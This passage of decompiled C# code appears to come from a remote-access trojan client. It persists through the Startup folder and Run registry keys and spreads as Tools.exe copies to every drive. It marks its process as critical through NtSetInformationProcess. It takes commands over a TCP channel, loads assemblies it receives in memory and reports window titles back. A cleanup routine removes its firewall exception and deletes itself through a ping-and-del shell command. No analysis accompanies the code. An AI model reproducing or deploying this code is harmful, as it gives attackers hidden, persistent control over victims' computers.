				File.Copy(fileInfo_0.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_5 + ".exe", overwrite: true);
				fileStream_0 = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_5 + ".exe", FileMode.Open);
			}
			catch (Exception ex6)
			{
				ProjectData.SetProjectError(ex6);
				Exception projectError6 = ex6;
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_17()
	{
		//IL_01a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ac: Expected O, but got Unknown
		if (bool_3)
		{
			GClass0.smethod_1();
		}
		checked
		{
			if (bool_5)
			{
				string programFiles = ((ServerComputer)Class3.Class2_0).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
				string[] logicalDrives = Directory.GetLogicalDrives();
				string[] array = logicalDrives;
				for (int i = 0; i < array.Length; i++)
				{
					programFiles = array[i];
					try
					{
						if (!File.Exists(programFiles + "Tools.exe"))
						{
							File.Copy(Assembly.GetExecutingAssembly().Location, programFiles + "Tools.exe");
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			if (Interaction.Command() != null)
			{
				try
				{
					((ServerComputer)computer_0).get_Registry().get_CurrentUser().SetValue("di", "!");
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception projectError2 = ex;
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(5000);
			}
			bool createdNew = false;
			mutex_0 = new Mutex(initiallyOwned: true, string_5, out createdNew);
			if (!createdNew)
			{
				ProjectData.EndApp();
			}
			smethod_16();
			if (!bool_2)
			{
				string_1 = fileInfo_0.get_Name();
				string_0 = fileInfo_0.Directory!.get_Name();
			}
			Thread thread = new Thread(smethod_21, 1);
			thread.Start();
			try
			{
				gclass1_0 = new GClass1();
				Thread thread2 = new Thread(gclass1_0.method_2, 1);
				thread2.Start();
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2);
				Exception projectError3 = ex2;
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			int num = 0;
			string text = "";
			if (bool_0)
			{
				try
				{
					SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
					{
						smethod_9();
					});
					smethod_20(1);
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception projectError4 = ex3;
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			while (true)
			{
				Thread.Sleep(1000);
				if (!bool_1)
				{
					text = "";
				}
				Application.DoEvents();
				try
				{
					num++;
					if (num == 5)
					{
						try
						{
							Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
						}
						catch (Exception ex4)
						{
							ProjectData.SetProjectError(ex4);
							Exception projectError5 = ex4;
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
					}
					if (num >= 8)
					{
						num = 0;
						string text2 = smethod_2();
						if (Operators.CompareString(text, text2, false) != 0)
						{
							text = text2;
							smethod_23("act" + string_9 + text2);
						}
					}
					if (!bool_6)
					{
						continue;
					}
					try
					{
						if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(((ServerComputer)computer_0).get_Registry().get_CurrentUser().GetValue(string_6 + "\\" + string_5, "")), (object)("\"" + fileInfo_0.FullName + "\" .."), false))
						{
							((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey(string_6, writable: true)!.SetValue(string_5, "\"" + fileInfo_0.FullName + "\" ..");
						}
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5);
						Exception projectError6 = ex5;
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					try
					{
						if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(((ServerComputer)computer_0).get_Registry().get_LocalMachine().GetValue(string_6 + "\\" + string_5, "")), (object)("\"" + fileInfo_0.FullName + "\" .."), false))
						{
							((ServerComputer)computer_0).get_Registry().get_LocalMachine().OpenSubKey(string_6, writable: true)!.SetValue(string_5, "\"" + fileInfo_0.FullName + "\" ..");
						}
					}
					catch (Exception ex6)
					{
						ProjectData.SetProjectError(ex6);
						Exception projectError7 = ex6;
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception projectError8 = ex7;
					ProjectData.SetProjectError(projectError8);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public static string smethod_18(byte[] byte_1)
	{
		byte_1 = new MD5CryptoServiceProvider().ComputeHash(byte_1);
		string text = "";
		byte[] array = byte_1;
		foreach (byte b in array)
		{
			text += b.ToString("x2");
		}
		return text;
	}

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

	public static object smethod_19(byte[] byte_1, string string_10)
	{
		Module[] modules = Assembly.Load(byte_1).GetModules();
		foreach (Module module in modules)
		{
			Type[] types = module.GetTypes();
			foreach (Type type in types)
			{
				if (type.FullName!.EndsWith("." + string_10))
				{
					return module.Assembly.CreateInstance(type.FullName);
				}
			}
		}
		return null;
	}

	public static void smethod_20(int int_0)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_0, 4);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_21()
	{
		checked
		{
			while (true)
			{
				string_3 = "";
				if (tcpClient_0 != null)
				{
					long num = -1L;
					int num2 = 0;
					try
					{
						while (true)
						{
							IL_026e:
							num2++;
							if (num2 == 10)
							{
								num2 = 0;
								Thread.Sleep(1);
							}
							if (!bool_1)
							{
								break;
							}
							if (tcpClient_0.Available < 1)
							{
								tcpClient_0.Client.Poll(-1, SelectMode.SelectRead);
							}
							while (tcpClient_0.Available > 0)
							{
								if (num == -1L)
								{
									string text = "";
									while (true)
									{
										int num3 = tcpClient_0.GetStream().ReadByte();
										switch (num3)
										{
										case 0:
											num = Conversions.ToLong(text);
											text = "";
											if (num == 0L)
											{
												smethod_23("");
												num = -1L;
											}
											if (tcpClient_0.Available > 0)
											{
												goto IL_016b;
											}
											goto IL_026e;
										case -1:
											goto end_IL_010b;
										}
										text += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(num3).ToString()));
										continue;
										end_IL_010b:
										break;
									}
									break;
								}
								byte_0 = new byte[tcpClient_0.Available + 1 - 1 + 1];
								long num4 = num - memoryStream_0.Length;
								if (byte_0.Length > num4)
								{
									byte_0 = new byte[(int)(num4 - 1L) + 1 - 1 + 1];
								}
								int count = tcpClient_0.Client.Receive(byte_0, 0, byte_0.Length, SocketFlags.None);
								memoryStream_0.Write(byte_0, 0, count);
								if (memoryStream_0.Length == num)
								{
									num = -1L;
									Thread thread = new Thread((ParameterizedThreadStart)delegate(byte[] byte_1)
									{
										smethod_14(byte_1);
									}, 1);
									thread.Start(memoryStream_0.ToArray());
									thread.Join(100);
									memoryStream_0.Dispose();
									memoryStream_0 = new MemoryStream();
								}
								goto IL_026e;
								IL_016b:;
							}
							break;
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception projectError = ex;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				do
				{
					try
					{
						if (object_0 != null)
						{
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(object_0), (Type)null, "clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
							object_0 = null;
						}
					}
					catch (Exception ex2)
					{
						ProjectData.SetProjectError(ex2);
						Exception projectError2 = ex2;
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					bool_1 = false;
				}
				while (!smethod_6());
				bool_1 = true;
			}
		}
	}

	public static byte[] smethod_22(ref string string_10)
	{
		return Encoding.UTF8.GetBytes(string_10);
	}

	public unsafe static bool smethod_23(object object_1)
	{
		return smethod_24(smethod_22(ref *(string*)(&object_1)));
	}

	public static bool smethod_24(byte[] byte_1)
	{
		if (!bool_1)
		{
			return false;
		}
		try
		{
			FileInfo fileInfo = fileInfo_0;
			lock (fileInfo)
			{
				if (!bool_1)
				{
					return false;
				}
				MemoryStream memoryStream = new MemoryStream();
				string string_ = byte_1.Length + "\0";
				byte[] array = smethod_22(ref string_);
				memoryStream.Write(array, 0, array.Length);
				memoryStream.Write(byte_1, 0, byte_1.Length);
				tcpClient_0.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			try
			{
				if (bool_1)
				{
					bool_1 = false;
					tcpClient_0.Close();
				}
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2);
				Exception projectError2 = ex2;
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return bool_1;
	}

	public static bool smethod_25(string string_10, object object_1, RegistryValueKind registryValueKind_0)
	{
		try
		{
			((ServerComputer)computer_0).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + string_5)
				.SetValue(string_10, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_1)), registryValueKind_0);
			return true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_26()
	{
		string programFiles = ((ServerComputer)Class3.Class2_0).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		for (int i = 0; i < array.Length; i = checked(i + 1))
		{
			programFiles = array[i];
			try
			{
				if (File.Exists(programFiles + "Tools.exe"))
				{
					File.Delete(programFiles + "Tools.exe");
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		smethod_20(0);
		bool_6 = false;
		try
		{
			((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey(string_6, writable: true)!.DeleteValue(string_5, throwOnMissingValue: false);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError2 = ex;
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)computer_0).get_Registry().get_LocalMachine().OpenSubKey(string_6, writable: true)!.DeleteValue(string_5, throwOnMissingValue: false);
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception projectError3 = ex2;
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("netsh firewall delete allowedprogram \"" + fileInfo_0.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception projectError4 = ex3;
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			if (fileStream_0 != null)
			{
				fileStream_0.Dispose();
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_5 + ".exe");
			}
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Exception projectError5 = ex4;
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey("Software", writable: true)!.DeleteSubKey(string_5, throwOnMissingSubKey: false);
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception projectError6 = ex5;
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + fileInfo_0.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception ex6)
		{
			ProjectData.SetProjectError(ex6);
			Exception projectError7 = ex6;
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	public static byte[] smethod_27(byte[] byte_1)
	{
		MemoryStream memoryStream = new MemoryStream(byte_1);
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		byte[] array = new byte[4];
		checked
		{
			memoryStream.Position = memoryStream.Length - 5L;
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			memoryStream.Position = 0L;
			byte[] array2 = new byte[num - 1 + 1 - 1 + 1];
			gZipStream.Read(array2, 0, num);
			gZipStream.Dispose();
			memoryStream.Dispose();
			return array2;
		}
	}
}
